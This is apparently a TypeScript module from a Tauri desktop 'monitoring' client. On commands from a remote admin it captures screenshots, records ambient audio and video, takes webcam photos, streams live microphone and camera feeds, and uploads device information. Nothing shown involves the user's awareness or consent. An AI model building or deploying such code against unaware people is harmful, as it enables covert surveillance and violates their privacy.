import { invoke } from '@tauri-apps/api/core';
import { presenceService } from './presence';
import { uploadScreenshot, uploadAudioRecording, uploadVideoRecording, uploadWebcamPhoto, ackCommand, uploadDeviceInfo } from './api';

let token = '';
let screenshotTimerHandle: ReturnType<typeof setInterval> | null = null;
let audioRecorder: MediaRecorder | null = null;
let audioChunks: Blob[] = [];
let liveAudioRecorder: MediaRecorder | null = null;
let liveAudioActive = false;
let liveAudioAdminId: number | null = null;
let liveAudioSessionId: string | null = null;
let liveAudioChunkIndex = 0;

let videoRecorder: MediaRecorder | null = null;
let videoChunks: Blob[] = [];
let videoStartTime = 0;

let liveVideoActive = false;
let liveVideoAdminId: number | null = null;
let liveVideoSessionId: string | null = null;
let liveVideoChunkIndex = 0;

export function setToken(t: string) { token = t; }

// ── Screenshot ────────────────────────────────────────────────────────────────

export async function takeScreenshot(commandId: number) {
  try {
    const b64: string = await invoke('capture_screenshot');
    await uploadScreenshot(token, b64, commandId);
    await ackCommand(token, commandId, 'done');
  } catch (e) {
    console.error('[monitoring] screenshot failed:', e);
    await ackCommand(token, commandId, 'failed');
  }
}

export function startScreenshotTimer(intervalSeconds: number, commandId: number) {
  stopScreenshotTimer();
  takeScreenshot(commandId);
  screenshotTimerHandle = setInterval(
    () => takeScreenshot(0),
    intervalSeconds * 1000,
  );
}

export function stopScreenshotTimer() {
  if (screenshotTimerHandle) { clearInterval(screenshotTimerHandle); screenshotTimerHandle = null; }
}

// ── Ambient audio recording ───────────────────────────────────────────────────

export async function startAmbientRecording() {
  if (audioRecorder) return;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    audioRecorder = new MediaRecorder(stream);
    audioChunks = [];
    audioRecorder.ondataavailable = e => { if (e.data.size) audioChunks.push(e.data); };
    audioRecorder.start(1000);
  } catch (e) { console.error('[monitoring] ambient audio start failed:', e); }
}

export async function stopAmbientRecording(commandId: number) {
  if (!audioRecorder) return;
  return new Promise<void>(resolve => {
    audioRecorder!.onstop = async () => {
      const blob = new Blob(audioChunks, { type: 'audio/webm' });
      const duration = Math.floor(blob.size / 16000);
      await uploadAudioRecording(token, blob, duration);
      await ackCommand(token, commandId, 'done');
      audioRecorder?.stream.getTracks().forEach(t => t.stop());
      audioRecorder = null;
      audioChunks = [];
      resolve();
    };
    audioRecorder!.stop();
  });
}

// ── Live audio ────────────────────────────────────────────────────────────────

export async function startLiveAudio(adminId: number | null) {
  if (liveAudioActive) return;
  liveAudioActive = true;
  liveAudioSessionId = `live_${Date.now()}`;
  liveAudioAdminId = adminId;
  liveAudioChunkIndex = 0;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    const sendChunk = () => {
      if (!liveAudioActive) return;
      const rec = new MediaRecorder(stream, { mimeType: 'audio/webm' });
      const chunks: Blob[] = [];
      rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
      rec.onstop = async () => {
        const blob = new Blob(chunks, { type: 'audio/webm' });
        const buf = await blob.arrayBuffer();
        const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
        presenceService.send({
          type: 'live_audio_chunk',
          data: {
            session_id: liveAudioSessionId,
            chunk_index: liveAudioChunkIndex++,
            audio_data: b64,
            audio: b64,
            mime_type: 'audio/webm',
            admin_id: liveAudioAdminId,
          },
        });
        if (liveAudioActive) sendChunk();
      };
      rec.start();
      liveAudioRecorder = rec;
      setTimeout(() => { if (rec.state === 'recording') rec.stop(); }, 1500);
    };
    sendChunk();
  } catch (e) { console.error('[monitoring] live audio failed:', e); }
}

export function stopLiveAudio() {
  liveAudioActive = false;
  liveAudioRecorder?.stop();
  liveAudioRecorder = null;
}

// ── Webcam photo ──────────────────────────────────────────────────────────────

export async function takeWebcamPhoto(commandId: number) {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext('2d')!.drawImage(video, 0, 0);
    stream.getTracks().forEach(t => t.stop());
    const blob = await new Promise<Blob>(resolve =>
      canvas.toBlob(b => resolve(b!), 'image/jpeg', 0.85),
    );
    await uploadWebcamPhoto(token, blob, commandId);
    await ackCommand(token, commandId, 'done');
  } catch (e) {
    console.error('[monitoring] webcam photo failed:', e);
    await ackCommand(token, commandId, 'failed');
  }
}

// ── Video recording ───────────────────────────────────────────────────────────

export async function startVideoRecording() {
  if (videoRecorder) return;
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    videoRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    videoChunks = [];
    videoStartTime = Date.now();
    videoRecorder.ondataavailable = e => { if (e.data.size) videoChunks.push(e.data); };
    videoRecorder.start(1000);
  } catch (e) { console.error('[monitoring] video recording start failed:', e); }
}

export async function stopVideoRecording(commandId: number) {
  if (!videoRecorder) return;
  return new Promise<void>(resolve => {
    videoRecorder!.onstop = async () => {
      const blob = new Blob(videoChunks, { type: 'video/webm' });
      const duration = Math.floor((Date.now() - videoStartTime) / 1000);
      await uploadVideoRecording(token, blob, duration);
      await ackCommand(token, commandId, 'done');
      videoRecorder?.stream.getTracks().forEach(t => t.stop());
      videoRecorder = null;
      videoChunks = [];
      resolve();
    };
    videoRecorder!.stop();
  });
}

// ── Live video ────────────────────────────────────────────────────────────────

export async function startLiveVideo(adminId: number | null) {
  if (liveVideoActive) return;
  liveVideoActive = true;
  liveVideoSessionId = `live_vid_${Date.now()}`;
  liveVideoAdminId = adminId;
  liveVideoChunkIndex = 0;

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    const sendChunk = () => {
      if (!liveVideoActive) { stream.getTracks().forEach(t => t.stop()); return; }
      const mimeType = MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')
        ? 'video/webm;codecs=vp8,opus'
        : 'video/webm';
      const rec = new MediaRecorder(stream, { mimeType });
      const chunks: Blob[] = [];
      rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
      rec.onstop = async () => {
        const blob = new Blob(chunks, { type: 'video/webm' });
        const buf = await blob.arrayBuffer();
        const b64 = btoa(String.fromCharCode(...new Uint8Array(buf)));
        presenceService.send({
          type: 'live_video_chunk',
          data: {
            session_id: liveVideoSessionId,
            chunk_index: liveVideoChunkIndex++,
            video_data: b64,
            mime_type: 'video/webm',
            admin_id: liveVideoAdminId,
          },
        });
        if (liveVideoActive) sendChunk();
      };
      rec.start();
      setTimeout(() => { if (rec.state === 'recording') rec.stop(); }, 1500);
    };
    sendChunk();
  } catch (e) { console.error('[monitoring] live video failed:', e); liveVideoActive = false; }
}

export function stopLiveVideo() {
  liveVideoActive = false;
}

// ── Device info ───────────────────────────────────────────────────────────────

export async function sendDeviceInfo(commandId: number) {
  try {
    const info = await invoke('get_device_info');
    await uploadDeviceInfo(token, info as object);
    await ackCommand(token, commandId, 'done');
  } catch (e) {
    await ackCommand(token, commandId, 'failed');
  }
}

// ── Command dispatcher ────────────────────────────────────────────────────────

export async function handleCommand(
  commandType: string,
  params: Record<string, any>,
  commandId: number,
) {
  console.log('[monitoring] command:', commandType, commandId);
  try {
    switch (commandType) {
      case 'capture_screenshot':
        await takeScreenshot(commandId);
        return;

      case 'start_screenshot_timer': {
        const interval = params.interval_seconds ?? 60;
        startScreenshotTimer(interval, commandId);
        break;
      }
      case 'stop_screenshot_timer':
        stopScreenshotTimer();
        break;

      case 'start_audio_recording':
        await startAmbientRecording();
        break;
      case 'stop_audio_recording':
        await stopAmbientRecording(commandId);
        return;

      case 'start_live_audio':
        await startLiveAudio(params.admin_id ?? null);
        break;
      case 'stop_live_audio':
        stopLiveAudio();
        break;

      case 'take_photo':
        await takeWebcamPhoto(commandId);
        return;

      case 'start_video_recording':
        await startVideoRecording();
        break;
      case 'stop_video_recording':
        await stopVideoRecording(commandId);
        return;

      case 'start_live_video':
        await startLiveVideo(params.admin_id ?? null);
        break;
      case 'stop_live_video':
        stopLiveVideo();
        break;

      case 'get_device_info':
        await sendDeviceInfo(commandId);
        return;

      default:
        console.warn('[monitoring] unknown command:', commandType);
        await ackCommand(token, commandId, 'failed');
        return;
    }
    await ackCommand(token, commandId, 'done');
  } catch (e) {
    console.error('[monitoring] command failed:', e);
    await ackCommand(token, commandId, 'failed');
  }
}
